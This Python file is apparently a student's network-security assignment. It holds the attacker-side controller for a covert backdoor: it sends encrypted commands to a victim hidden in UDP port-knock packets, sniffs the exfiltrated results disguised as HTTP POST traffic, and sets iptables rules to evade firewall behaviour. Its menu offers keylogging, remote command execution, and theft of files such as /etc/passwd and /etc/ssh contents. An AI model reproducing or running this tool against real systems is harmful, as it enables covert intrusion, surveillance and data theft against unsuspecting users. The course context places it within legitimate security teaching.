#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
sender.py
    - Contains sender command line UI send a command hidden in UDP port knocking to receiver backdoor,
      then decrypts the data returned from backdoor and display to user.
----------------------------------------------------------------------------------------------------
"""
import socket as sock
from _thread import *
from scapy.all import *
from scapy.layers.inet import *
import encryption
import textwrap
# Set scapy to use libpcap library to circumvent iptables rules.
from scapy.all import conf
conf.use_pcap = True

LOG_PATH = "log.txt"
CONFIGURATION_PATH = "configuration.txt"


class Configuration:
    def __init__(self):
        self.receiver_address = ''
        self.sender_address = ''
        self.receiver_port = 0
        self.sender_port = 0
        self.port_knock_password_base = ''
        self.port_knock_password_seq_num = ''
        self.delimiter = ''

        with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
            fp = [line.rstrip('\n') for line in file]
            for line in fp:
                if line.isspace() or line.startswith('#'):
                    continue

                config_data = line.split('=')
                if config_data[0] == 'receiver_address':
                    self.receiver_address = config_data[1]
                elif config_data[0] == 'sender_address':
                    self.sender_address = config_data[1]
                elif config_data[0] == 'sender_port':
                    if config_data[1].isdigit():
                        self.sender_port = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                elif config_data[0] == 'receiver_port':
                    if config_data[1].isdigit():
                        self.receiver_port = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                elif config_data[0] == 'port_knock_password_base':
                    self.port_knock_password_base = config_data[1]
                elif config_data[0] == 'port_knock_password_seq_num':
                    self.port_knock_password_seq_num = config_data[1]
                elif config_data[0] == 'delimiter':
                    self.delimiter = config_data[1]

    def update_port_knock_password_seq_num(self):
        self.port_knock_password_seq_num = str(int(self.port_knock_password_seq_num) + 1)

        with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
            data = file.readlines()

        for idx, a in enumerate(data):
            if "port_knock_password_seq_num" in a:
                data[idx] = "port_knock_password_seq_num=" + str(self.port_knock_password_seq_num) + "\n"

        with open(file=CONFIGURATION_PATH, mode='w', encoding='utf-8') as file:
            file.writelines(data)


# Initialize configuration class
config = Configuration()


# def read_configuration():
#     """
#     Reads configuration file.
#     :return: list (config vars)
#     """
#     configuration = {
#         'receiver_address': '',
#         'sender_address': '',
#         'receiver_port1': 0,
#         'receiver_port2': 0,
#         'receiver_port3': 0,
#         'sender_port': 0,
#         'port_knock_auth': '',
#     }
#
#     with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
#         fp = [line.rstrip('\n') for line in file]
#         for line in fp:
#             if line.isspace() or line.startswith('#'):
#                 continue
#
#             config_data = line.split('=')
#             if config_data[0] in configuration:
#                 if config_data[0] in ('receiver_address', 'sender_address', 'port_knock_auth'):
#                     configuration[config_data[0]] = config_data[1]
#                 elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
#                     data = config_data[1]
#                     if data.isdigit():
#                         configuration[config_data[0]] = int(config_data[1])
#                     else:
#                         print("Invalid configuration, ports must be integers.")
#                         exit()
#                 else:
#                     print("Invalid configuration, unsupported variable detected.")
#                     exit()
#
#     return configuration


def start_sender():
    """
    Initializes command line UI for attacker to send shell commands to a backdoor receiver.
    Calls port-knocking and listening for response for each commands sent.
    :return: None
    """

    # with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:

    # with open(file="/root/Desktop/write_test/cool_cat.bmp", mode='rb') as file:  # b is important -> binary
    #     fileContent = file.read()
    # filename = "test.bmp"
    # print(f"type fileContent: {type(fileContent)}")
    # ef = encryption.encrypt(fileContent).decode('utf-8')
    # print(f"type encrypt: {type(encryption.encrypt(fileContent))}")
    # print(f"type ef: {type(ef)}")
    # sf = encryption.decrypt(ef.encode('utf-8'))
    # print(f"type sf: {type(sf)}")
    #
    # with open(file=f"/root/Desktop/write_test/{filename}", mode='wb') as file:
    #     file.write(sf)
    #
    # return

    # Generate encryption key if needed. Ensure both sender and receiver have same key.
    encryption.generate_key()

    # Read Configuration
    global config
    config = Configuration()
    receiver_addr = config.receiver_address
    port1 = config.receiver_port
    port2 = config.receiver_port
    port3 = config.receiver_port
    sender_addr = config.sender_address
    sender_port = config.sender_port
    delimiter = config.delimiter

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    try:
        ipcmd = f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {IPAddr} --sport 80 -j DROP'
        result2 = subprocess.run(ipcmd, capture_output=True, text=True, shell=True).stdout
    except Exception:
        result2 = "Could not set iptables rule to drop port 80 reset packets."
    print(f"subprocess set iptables rule result: {result2}")

    # hostname = socket.gethostname()
    # IPAddr = socket.gethostbyname(hostname)
    # start_new_thread(data_server, (IPAddr, sender_port))

    start_new_thread(start_sniff, ())

    keep_going = True
    while keep_going:
        print(f"====================================\n"
              f"Attacker Menu:\n"
              f"    1. Start keylogger\n"
              f"    2. Stop keylogger\n"
              f"    3. Execute a command\n"
              f"    4. Transfer a file from victim to attacker\n"
              f"    5. Start watching a file on victim\n"
              f"    6. Stop watching file\n"
              f"    7. Start watching a directory on victim\n"
              f"    8. Stop watching directory\n"
              f"    9. Exit\n")
        user_input = input("Type number and press enter:\n")
        command = ''

        if user_input == "1":
            command = user_input
            print(command)
        elif user_input == "2":
            command = user_input
            print(command)
        elif user_input == "3":
            user_input2 = input("Type in command (E.g. ifconfig):\n")
            command = user_input + delimiter + user_input2
            print(command)
        elif user_input == "4":
            user_input2 = input("Type in file path (E.g. /etc/passwd):\n")
            command = user_input + delimiter + user_input2
            print(command)
        elif user_input == "5":
            user_input2 = input("Type in file path (E.g. /etc/passwd):\n")
            command = user_input + delimiter + user_input2
            print(command)
        elif user_input == "6":
            command = user_input
            print(command)
        elif user_input == "7":
            user_input2 = input("Type in directory path (E.g. /etc/ssh):\n")
            command = user_input + delimiter + user_input2
            print(command)
        elif user_input == "8":
            command = user_input
            print(command)
        elif user_input == "9":
            command = user_input
            print(command)
            print("Do some Exit stuff")
            print("Attacker Exiting.")
            break
        else:
            print("Invalid input, try again.")

        try:
            encoded_input = command.encode("utf-8").decode("utf-8")
        except UnicodeEncodeError or UnicodeDecodeError:
            print("Invalid character detected. Must be UTF-8 supported values only.")
            continue

        # Send command with port-knocking.
        send_port_knock(command)

        # Listen for backdoor response.
        # data_server(IPAddr, sender_port)

    try:
        ipcmd = f'iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {IPAddr} --sport 80 -j DROP'
        result2 = subprocess.run(ipcmd, capture_output=True, text=True, shell=True).stdout
    except Exception:
        result2 = "Could not drop iptables rule to drop port 80 reset packets."
    print(f"subprocess drop iptables rule result: {result2}")


def start_sniff():
    print("Sniff started.")
    sniff(prn=process_sniff_pkt, filter=f"src host {config.receiver_address} and tcp dst port {config.sender_port}",
          store=0)


def process_sniff_pkt(pkt):
    """
    Callback function that processes each packet sniffed for valid backdoor sequence.
    UDP packets must port knock port 1-3 in config file in the right order, while also containing
    the auth_string as payload specified in config file.
    If a valid port knock is detected, decrypt command from payload to execute.
    :param pkt: scapy packet
    :return: None
    """
    global config
    global packet_list
    packet_list = {"instruction": 0, "session_name": "", "session_total": 0}


    ip_dst = pkt.payload.dst
    if ip_dst != config.sender_address:
        return

    # dst_port = pkt.payload.payload.dport
    check_data = bytes(pkt.payload.payload.payload)
    try:
        encoded_input = check_data.decode("utf-8")
    except UnicodeDecodeError:
        # print("Unauthorized Non-unicode payload for backdoor.")
        return

    data = check_data.decode("utf-8")

    # if type(check_data) == bytes:
    #     print(f"Payload: {check_data.decode('utf-8')}")
    #     data = check_data.decode('utf-8')

    if packet_list["instruction"] == 0:
        if not data.startswith("POST"):
            print("Received packet without POST instructions, dropping packet. POSSIBLE OUT OF ORDER.")
            return

    if data.startswith("POST"):
        # instruction = (1-9), session_name = file name, session_total = total packets
        packet_list = {"instruction": 0, "session_name": "", "session_total": 0}

        cookie = data.split("Cookie:")[1].split("Connection:")[0].strip()
        instruction = cookie.split(",")[0].split("=")[1].strip()
        session_name = cookie.split(",")[1].split("=")[1].strip()
        session = str(int(cookie.split(",")[2].split("=")[1].strip()))
        content = data.split("Content-Length: ")[1].split(maxsplit=1)[1].strip()
        print(instruction)
        print(f"session_name: {session_name}")
        print(session)
        print(content)
        session_current = 1
        session_total = session
        print(f"session_current: {session_current}")
        print(f"session_total: {session_total}")

        packet_list["instruction"] = instruction
        packet_list["session_name"] = session_name
        packet_list["session_total"] = session_total
        packet_list[session_current] = content
    else:
        s_data = data.strip().rsplit(config.delimiter)
        content = s_data[0]
        session_current = str(int(s_data[1]))
        packet_list[session_current] = content

    print(f"len of packet list= {len(packet_list)}")
    print(packet_list)
    if len(packet_list) - 3 >= int(packet_list["session_total"]):
        complete_data = ""
        for idx in range(len(packet_list) - 3):
            complete_data += packet_list[str(idx+1)]

        process_data(packet_list["instruction"], complete_data, packet_list["session_name"])
    else:
        return



    # slice out packet_start
    # s_data = data[4:]
    # decrypt_cmd = ""
    # commands = []
    # try:
    #     print(f"Encrypted Cmd: {s_data}")
    #     decrypt_cmd = encryption.decrypt(s_data.encode('utf-8')).decode('utf-8')
    #     print(f"Cmd: {decrypt_cmd}")
    #     commands = decrypt_cmd.split(config.delimiter)
    # except:
    #     print(f"Decryption Failed:\n{decrypt_cmd}")
    #
    # print(commands)
    # one_time_password = config.port_knock_password_base + config.port_knock_password_seq_num
    # packet_password = commands[0]
    # order = commands[1]
    # print(len(commands))
    # if len(commands) > 2:
    #     instruction = commands[2]
    # if len(commands) > 3:
    #     instruction_input = commands[3]
    #
    # if one_time_password != packet_password:
    #     print(f"Password Don't Match!\n{one_time_password}\n{packet_password}")
    #     return
    # print(f"Password Matched!\n{one_time_password}\n{packet_password}")
    #
    # if order == "1/1":
    #     instruction = commands[2]
    #     if instruction == "1":
    #         print(instruction)
    #     elif instruction == "2":
    #         print(instruction)
    #     elif instruction == "3":
    #         instruction_input = commands[3]
    #         print(instruction)
    #         print(instruction_input)
    #         result = run_commands(instruction_input)
    #         # encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
    #         # send_command_output(encrypted_data, address, sender_port)
    #     elif instruction == "4":
    #         instruction_input = commands[3]
    #         print(instruction)
    #         print(instruction_input)
    #     elif instruction == "5":
    #         instruction_input = commands[3]
    #         print(instruction)
    #         print(instruction_input)
    #     elif instruction == "6":
    #         print(instruction)
    #     elif instruction == "7":
    #         instruction_input = commands[3]
    #         print(instruction)
    #         print(instruction_input)
    #     elif instruction == "8":
    #         print(instruction)
    #     elif instruction == "9":
    #         print(instruction)
    #     else:
    #         print(f"WARNING, invalid instruction: {instruction}.")
    #
    # return

    # Instruction only stored in first packet
    # If multi-packet, save to packet_list dictionary style 1:data, 2:data


def process_data(instruction, data, filename=""):

    if instruction == "1":
        print(instruction)
    elif instruction == "2":
        print(instruction)
    elif instruction == "3":
        print(f"Instruction: {instruction}")
        decrypted_data = encryption.decrypt(data.encode('utf-8')).decode('utf-8')
        with open(file=f"/root/Desktop/write_test/{LOG_PATH}", mode='a') as file:
            file.write(decrypted_data)
        print(f"Output: /root/Desktop/write_test/{LOG_PATH}")
    elif instruction == "4":
        print(f"Instruction: {instruction}")
        # print(data)
        decrypted_data = encryption.decrypt(data.encode('utf-8')).decode('utf-8')
        # print(decrypted_data)
        with open(file=f"/root/Desktop/write_test/{filename}", mode='wb') as file:
            file.write(decrypted_data)
        print(f"Output: /root/Desktop/write_test/{filename}")
    elif instruction == "5":
        print(instruction)
    elif instruction == "6":
        print(instruction)
    elif instruction == "7":
        print(instruction)
    elif instruction == "8":
        print(instruction)
    elif instruction == "9":
        print(instruction)
    else:
        print(f"WARNING, invalid instruction: {instruction}.")





def send_port_knock(command):
    """
    Performs port-knocking sequence on the receiver backdoor.
    UDP packets are sent with auth_string as payload in order to port 1-3 as specified in config file.
    Command is encrypted and send with final packet in port-knocking sequence.
    :param command: str of command to send to victim
    :param receiver_addr: IP address
    :param port1: int of port
    :param port2: int of port
    :param port3: int of port
    :param port_knock_auth: str used for authentication
    :return: None
    """
    global config

    # port = RandShort()
    port = config.receiver_port
    receiver_addr = config.receiver_address
    packet_start = "$$!!"
    delimiter = config.delimiter

    sport = RandShort()
    one_time_password = config.port_knock_password_base+config.port_knock_password_seq_num

    msg_len = len(command.encode('utf-8'))
    if msg_len <= 240:
        packet_order = f"{delimiter}1/1"
        message = one_time_password + packet_order + delimiter + command
        encrypt_msg = packet_start + encryption.encrypt(message.encode('utf-8')).decode('utf-8')
        encrypt_len = len(encrypt_msg.encode('utf-8'))
        if encrypt_len > 508:
            print("Warning, payload in port knock packet exceeding 508 bytes, may not decrypt if payload "
                  "is truncated.")
        port_knock1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
        send(port_knock1, verbose=0)
    else:
        parts = textwrap.wrap(command, 240)

        for idx, part in enumerate(parts):
            packet_order = f"{delimiter}{idx}/{len(parts)}"
            message = one_time_password + packet_order + delimiter + command
            encrypt_msg = packet_start + encryption.encrypt(message.encode('utf-8')).decode('utf-8')
            encrypt_len = len(encrypt_msg.encode('utf-8'))
            if encrypt_len > 508:
                print("Warning, payload in port knock packet exceeding 508 bytes, may not decrypt if payload "
                      "is truncated.")
                port_knock2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
                send(port_knock2, verbose=0)
        # print("Warning, payload in port knock packet exceeding 500 bytes, may not decrypt if payload truncated.")


    # Port-knocking 3 UDP ports with Auth keyword as payload. Include command at end of last packet payload.
    # port_knock_1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port1) / Raw(load=port_knock_auth)
    # port_knock_2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port2) / Raw(load=port_knock_auth)
    # port_knock_3 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port3) / Raw(load=command_payload)
    # send(port_knock_1, verbose=0)
    # send(port_knock_2, verbose=0)
    # send(port_knock_3, verbose=0)


def data_server(address, port):
    """
    Creates a socket that listens for a single TCP response from the receiver backdoor.
    Decrypts the data and closes the socket connection.
    :param address: IP address
    :param port: int of port
    :return: None
    """
    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as IPv4_sock:
        IPv4_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
        IPv4_sock.bind((address, port))
        IPv4_sock.listen(10)
        # print("Listening on: ", IPv4_sock.getsockname())

        # while True:
        conn, addr = IPv4_sock.accept()

        data_full = ''
        while True:
            data = conn.recv(1024).decode('utf-8')
            if data:
                data_full += data
            else:
                conn.close()
                break
        print(f"Encrypted Data: {data_full}")
        decrypted_data = encryption.decrypt(data_full.encode('utf-8')).decode('utf-8')
        print(f"Data: {decrypted_data}")


if __name__ == "__main__":
    try:
        start_sender()
    except KeyboardInterrupt as e:
        print("Attacker Shutdown")
        exit()


